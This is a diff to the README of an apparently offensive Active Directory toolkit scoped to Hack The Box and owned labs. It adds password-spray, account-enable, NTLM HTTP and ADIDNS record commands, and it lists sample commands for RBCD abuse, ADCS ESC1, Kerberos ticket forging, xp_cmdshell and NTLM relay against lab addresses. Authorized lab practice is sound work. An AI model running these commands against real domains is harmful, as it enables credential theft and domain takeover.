@@ -7,8 +7,8 @@ Authorized **HTB / owned lab** helpers that run **without** a C2 session or team
 | Command | Purpose |
 | --- | --- |
 | `ark inbound …` | tun0 / listeners / SOCKS env / SSH reverse tunnel / TCP redirector |
-| `ark ldap …` | Host-side LDAPS bind / enum / dangling ADCS template names |
-| `ark smb …` | Host-side SMB shares / ls / get (NTLM or `--ticket` native Kerberos; Impacket wrap: `ARK_SMB_IMPACKET=1`) |
+| `ark ldap …` | Host-side LDAPS bind / enum / enable-disable / spray / dangling ADCS template names |
+| `ark smb …` | Host-side SMB shares / ls / get (NTLM or `--ticket` native Kerberos; `--anon` is Guest; Impacket wrap: `ARK_SMB_IMPACKET=1`) |
 | `ark adcs …` | Dangling ESC1 template create / grant / WCCE req / auto. Then `ark kerberos pkinit --pfx` |
 | `ark rbcd …` | Host-side RBCD write / clear / show |
 | `ark kerberos …` | Skew, AES asktgt (or `--hash` NT overpass), S4U, keylist, golden/silver, ticket import, PKINIT UnPAC (`pkinit --pfx`) |
@@ -17,6 +17,8 @@ Authorized **HTB / owned lab** helpers that run **without** a C2 session or team
 | `ark ad prp …` | RODC PRP: clear NeverReveal / add RevealOnDemand |
 | `ark ad shadow auto …` | KeyCredentialLink write + PFX |
 | `ark winrm …` | Host-side PSRP (pypsrp; needs repo `scripts/` or `ARK_ROOT`) |
+| `ark http …` | Host-side HTTP GET/POST with NTLM (`--insecure` for lab TLS) |
+| `ark dns …` | Host-side ADIDNS add/delete A records (LDAP; `--forest` for ForestDnsZones) |
 | `ark mssql …` | Host-side MSSQL query / xp_cmdshell (impacket; SOCKS) |
 | `ark mqtt …` | MQTT subscribe / publish / healthcheck URL hijack |
 | `ark relay http …` | HTTP NTLM capture → relay to target → held session GET (LFI) |
@@ -94,9 +96,11 @@ DanglingTree-class boxes often have creds long before WinRM/RDP. Prefer files fo
 ```bash
 ark ldap bind --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass
 ark ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type interesting
-ark ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type acl
+ark ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type acl --sam m.carter
 ark ldap dangling --dc 10.129.x.x --domain danglingtree.htb --user jake.h --pass-file ./jake.pass
 ark ldap set --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --target bob scriptPath loot.bat --yes
+ark ldap enable --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --target bob --yes
+ark ldap spray --dc 10.129.x.x --domain danglingtree.htb --user-file ./users.txt --pass-file ./p --delay 2s --yes
 ark ad add-computer --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --name ATTACK --out ./mach.pass --yes
 ark rbcd write --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$ --from ATTACK$ --yes
 ark rbcd show  --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$
@@ -113,11 +117,13 @@ ark mssql query --host 172.16.0.11 --user U --pass-file P --windows --sql "SELEC
 ark kerberos asktgt --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p
 ark kerberos ticket import ./admin.ccache
 ark ldap bind --dc 10.129.x.x --domain danglingtree.htb --ticket <id>
-ark smb ls --host 10.129.x.x --share C$ --ticket <id>
+ark smb ls --host 10.129.x.x --hostname dc.danglingtree.htb --share C$ --ticket <id>
+ark http get --url https://10.129.x.x/ --user U --pass-file ./p --domain danglingtree.htb --insecure
+ark dns add --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --name testdns --type A --data 10.10.14.1 --yes
 ark kerberos keylist --dc 10.129.x.x --domain danglingtree.htb \
   --user Administrator --rodc-no N --aes-file ./rodc.aes
 
-ark smb shares --host 10.129.x.x --anon
+ark smb shares --host 10.129.x.x --anon   # Guest session; signing-required DCs reject Guest
 ark smb get --host 10.129.x.x --share IT --path DanglingTree_RoE_Assessment.pdf --out roe.pdf
 
 # ForceChangePassword (do not put the sAM prefix in the new password)
